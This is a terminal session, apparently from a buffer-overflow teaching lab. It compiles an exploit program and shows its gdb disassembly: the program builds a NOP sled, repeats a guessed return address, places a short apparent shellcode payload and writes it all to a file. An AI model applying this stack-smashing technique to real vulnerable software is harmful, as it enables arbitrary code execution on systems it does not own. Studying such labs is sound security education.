seed@ubuntu:~/Desktop$ ls
badfile  call_shellcode  call_shellcode.c  exploit  exploit.c  gnome-terminal.desktop  scrap  stack  stack.c  testbuff  testbuff.c  testvul.c
seed@ubuntu:~/Desktop$ gcc -o exploit exploit.c -g
seed@ubuntu:~/Desktop$ gdb -q exploit
Reading symbols from /home/seed/Desktop/exploit...done.
(gdb) disassemble main
Dump of assembler code for function main:
   0x080484cb <+0>:	push   %ebp
   0x080484cc <+1>:	mov    %esp,%ebp
   0x080484ce <+3>:	and    $0xfffffff0,%esp
   0x080484d1 <+6>:	sub    $0x240,%esp
   0x080484d7 <+12>:	mov    0xc(%ebp),%eax
   0x080484da <+15>:	mov    %eax,0x1c(%esp)
   0x080484de <+19>:	mov    %gs:0x14,%eax
   0x080484e4 <+25>:	mov    %eax,0x23c(%esp)
   0x080484eb <+32>:	xor    %eax,%eax
   0x080484ed <+34>:	movl   $0x205,0x8(%esp)
   0x080484f5 <+42>:	movl   $0x90,0x4(%esp)
   0x080484fd <+50>:	lea    0x37(%esp),%eax
   0x08048501 <+54>:	mov    %eax,(%esp)
   0x08048504 <+57>:	call   0x80483a4 <memset@plt>
   0x08048509 <+62>:	call   0x80484c4 <stack_pointer>
   0x0804850e <+67>:	add    $0x15e,%eax
   0x08048513 <+72>:	mov    %eax,0x28(%esp)
   0x08048517 <+76>:	lea    0x37(%esp),%eax
   0x0804851b <+80>:	mov    %eax,0x30(%esp)
   0x0804851f <+84>:	movl   $0x0,0x2c(%esp)
   0x08048527 <+92>:	jmp    0x804853d <main+114>
   0x08048529 <+94>:	mov    0x30(%esp),%eax
   0x0804852d <+98>:	mov    0x28(%esp),%edx
   0x08048531 <+102>:	mov    %edx,(%eax)
   0x08048533 <+104>:	addl   $0x4,0x30(%esp)
   0x08048538 <+109>:	addl   $0x1,0x2c(%esp)
   0x0804853d <+114>:	cmpl   $0x4f,0x2c(%esp)
   0x08048542 <+119>:	jle    0x8048529 <main+94>
   0x08048544 <+121>:	movl   $0x0,0x2c(%esp)
   0x0804854c <+129>:	jmp    0x804856d <main+162>
   0x0804854e <+131>:	mov    0x2c(%esp),%eax
   0x08048552 <+135>:	lea    0x1e6(%eax),%edx
   0x08048558 <+141>:	mov    0x2c(%esp),%eax
   0x0804855c <+145>:	add    $0x804a024,%eax
   0x08048561 <+150>:	movzbl (%eax),%eax
   0x08048564 <+153>:	mov    %al,0x37(%esp,%edx,1)
   0x08048568 <+157>:	addl   $0x1,0x2c(%esp)
   0x0804856d <+162>:	mov    0x2c(%esp),%eax
   0x08048571 <+166>:	cmp    $0x18,%eax
   0x08048574 <+169>:	jbe    0x804854e <main+131>
   0x08048576 <+171>:	movb   $0x0,0x23b(%esp)
   0x0804857e <+179>:	mov    $0x80486a0,%edx
   0x08048583 <+184>:	mov    $0x80486a2,%eax
   0x08048588 <+189>:	mov    %edx,0x4(%esp)
   0x0804858c <+193>:	mov    %eax,(%esp)
   0x0804858f <+196>:	call   0x80483d4 <fopen@plt>
   0x08048594 <+201>:	mov    %eax,0x24(%esp)
   0x08048598 <+205>:	mov    0x24(%esp),%eax
   0x0804859c <+209>:	mov    %eax,0xc(%esp)
   0x080485a0 <+213>:	movl   $0x1,0x8(%esp)
   0x080485a8 <+221>:	movl   $0x205,0x4(%esp)
   0x080485b0 <+229>:	lea    0x37(%esp),%eax
   0x080485b4 <+233>:	mov    %eax,(%esp)
   0x080485b7 <+236>:	call   0x80483e4 <fwrite@plt>
   0x080485bc <+241>:	mov    0x24(%esp),%eax
   0x080485c0 <+245>:	mov    %eax,(%esp)
   0x080485c3 <+248>:	call   0x80483c4 <fclose@plt>
   0x080485c8 <+253>:	mov    0x23c(%esp),%eax
   0x080485cf <+260>:	xor    %gs:0x14,%eax
   0x080485d6 <+267>:	je     0x80485dd <main+274>
   0x080485d8 <+269>:	call   0x80483f4 <__stack_chk_fail@plt>
---Type <return> to continue, or q <return> to quit---
   0x080485dd <+274>:	leave  
   0x080485de <+275>:	ret    
End of assembler dump.

